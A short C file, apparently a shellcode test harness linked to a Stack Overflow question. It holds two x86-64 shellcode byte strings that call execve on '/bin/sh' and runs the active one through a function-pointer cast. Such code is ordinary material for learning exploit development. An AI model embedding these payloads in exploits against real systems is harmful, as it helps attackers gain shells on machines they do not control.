// working custom shellcode
// https://stackoverflow.com/questions/64415910/shellcode-illegal-instruction
int main(void)
{
    char shellcode[]="\xeb\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff\x31\xc0\x88\x05\xf7\xff\xff\xff\x48\x8d\x3d\xe9\xff\xff\xff\x50\x57\x48\x89\xe6\x31\xd2\xb0\x3b\x0f\x05";

    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
// #include <stdio.h>
//
// unsigned char shellcode[] = \
// "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
// void main()
// {
//     int (*ret)() = (int(*)())shellcode;
//     ret();
// }
